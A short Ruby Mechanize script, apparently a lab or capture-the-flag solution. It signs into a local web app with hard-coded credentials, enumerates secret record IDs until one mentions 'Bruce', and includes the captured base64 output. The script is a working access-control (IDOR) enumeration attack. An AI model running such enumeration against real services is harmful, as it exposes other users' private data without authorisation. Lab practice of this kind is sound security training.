require 'mechanize'

Mechanize.new.instance_eval do
  get 'http://localhost:3000/users/sign_in'

  page.forms.first.tap do |f|
    f['user[email]']      = 'fox@fox.com'
    f['user[password]']   = '123456789'
    f.submit
  end

  print 'Searching'

  (1..831).each do |id|
    print '.'

    get 'http://localhost:3000/secrets/' + id.to_s

    if page.body =~ /Bruce/
      puts "\n---Found---"
      puts page.search('.secret').text.strip
      break
    end 
  end
end

# Output - Jeremy fox

=begin
---Found---
c3h5PqT4KaSW0dENJXQ0/XHgNj8yRzHyuoNSBujmlgI3Qkge+oikiG6KZfbaEIVMnMx34VU5GwwMpI
s1SDSK6QlSwWrBC9YxVxMKuap1HJfYRdNjQtLioaqG9AKRy/YuwV8WHu2QKmq7xc07EzSg4jWsFvFb
bhzMfbO7NHmvjsOtCRyOiMp4t+CZo8LgOkaaHAYKX/hDqgpgX96moncHicopBTLFVHMwsvot1R1wDmg
ABGUT7Rh+neJu2b6lZC7+x8rJipZp7gGkkaqcACRaItfY7ZbE9P6FafoWqDz0ngTdnwq4IyMivJx5DX
1iTq2UgVFIP02sTxNSqelVK269fO6CbX3uXVEDToO8YPCI9K4CgRxOOGa+4CbAEmwIMPuusqTfMCcqqi
0q6XPPI/hJ/0LJTAq+iER+HgHgKJVJcA1JGrwA8vEtoYFCLo6S/eoT36PcfRU3Ffxec+45VpxUsqvqPW
mHs6/vnKybtA0TKq0G5mN1SabYH/qHxAq7ydAe6HbVq5MUvZibc3yFih71rID6p4tXdmK/7RLYPRZ5SRp
6DbWiFcq25GlnPBFKk5Up/wD1R51i/JLpKz59ndxR1wjY0U8E8iBEbP8sZ+p2XOHFDLNLyOEoQpwsTH4W
6uF6ND+zkwf3Qd50VV0TzqMeFvYFMIpjvQOOfEnCIhySqWyRz4dwD8MvSp11STH2gUPfvVbRaP3aPpMjT
7dgmUMb7/fk4BFOKhvULb+bUNeMImJeTj1+67n1U4iceeCWpn9s/pE3uBuGQ9tn32zpegf54BT3wMT+B0
oikn8XMECwxQ6OgDvBZO9uRuk5MWbatb3FgkqWtSpcNW/fJT3XW2YdPbSP6VXB+/0+JyIlCd4ENKZJvd1H
XAFn3HflFtQJoiIWtMsaAzgvJaprEk6gnb7I1PIa6pV8nr3ZDUxg3erWwL76BirU9Ob+Xi+zvoEpdP6KkmL
bIbQaOyYdff01zA+RuKZIyOsJIm+34fLiX2Xvi5RR/jsa+Q4+OdjG9g5pn6vIcwa4itq7td6Mhwv3LMCY+t
kgucyEwebab0tnOaYnFVMmMqPiODznLLm4Kc7Qk/TpjBOSGEA+7Sy2VOf950JtqSyuyrT2eMBg4e6k/biBET
8Fm3hrBkxI4SjrqAWRy9xZo+f1wB/mew6ToeuTdxar119IXLQRs84MidEp83AV8Vkn8LanmgvuYCpelzyuOU
luUVY4zvwzaBOtEumzQGlVVMZvsMA7nbtEMorN2bNpNi93SPRvfHsD0ZA8YU/fX7qWJ3STdTLUtPGg6oWOgIl
SVvHPT0dyoB7HJsQvNd1IQJE1V3hG6Mf4MknOnk6rNccqm+/q5vxllcAf/fRTGjV1Pg==
=end